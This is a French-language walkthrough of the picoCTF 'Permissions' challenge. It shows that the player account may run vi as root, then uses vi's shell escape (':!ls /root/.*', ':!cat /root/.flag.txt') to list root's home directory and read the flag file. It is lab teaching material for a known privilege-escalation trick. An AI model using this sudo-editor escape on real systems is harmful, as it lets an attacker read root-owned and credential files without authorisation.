# Permissions

## Enoncé
Catégorie : [General Skills](../)

Points : 100

Tags : `vim`

Description :
> Can you read files in the root file?  
> The system admin has provisioned an account for you on the main server:  
> `ssh -p xxxxx picoplayer@saturn.picoctf.net`  
> Password: `xxxxx`  
> Can you login and read the root file?

Hints :
1. What permissions do you have?


## Approche

L'examen des droits `sudo` pour le user `picoplayer` montre des droits particuliers pour l'utilisation de l'éditeur `vi` :
```bash
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```


## Solution

On utilise les possibilités d'exécution de commande depuis `vi`. Tout d'abord pour lister les fichiers présents dans le HOME directory du user `root`, puis pour afficher le contenu du fichier qui nous intéresse.

On démarre donc `vi` via `sudo` :
```
picoplayer@challenge:~$ sudo vi
```

Depuis `vi` on passe en mode ligne de commande (via ':') et on demande l'exécution d'une commande (via '!') :
```
:!ls /root/.*

/root/.bashrc  /root/.flag.txt  /root/.profile  /root/.viminfo

/root/.:

/root/..:
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var

Press ENTER or type command to continue
```

On renouvelle l'opération, pour afficher le contenu du fichier `.flag.txt` :
```
:!cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_xxxxxxxx}
Press ENTER or type command to continue
```
